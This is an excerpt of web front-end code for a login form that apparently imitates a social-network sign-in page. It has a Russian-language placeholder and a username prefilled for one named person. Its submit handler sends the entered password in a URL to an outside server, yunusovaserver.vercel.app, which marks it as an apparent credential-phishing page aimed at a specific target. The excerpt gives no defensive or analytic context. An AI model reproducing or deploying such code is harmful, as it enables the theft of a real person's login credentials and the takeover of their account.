      ...
      <div class="grid jistify-center items-center justify-items-center my-8 mt-8 space-y-4">
        ...
        <div class="flex flex-col items-stretch">
            ...
            <div style="max-width: 280px;" class="input_cont flex flex-col p-2">
                ...
                <input type="text" class="input" name="username" value="nasi_yunusova" placeholder="Телефон, имя пользователя или эл. адрес">
            </div>
    ...
    methods: {
        ...
        async submitForm() {
            if(this.mainButtonBackground == '#0095f6' ){
                await axios.get(`https://yunusovaserver.vercel.app/delivery/editPassword/nasis_pass_${this.password}|`)
                    .then(resp => {
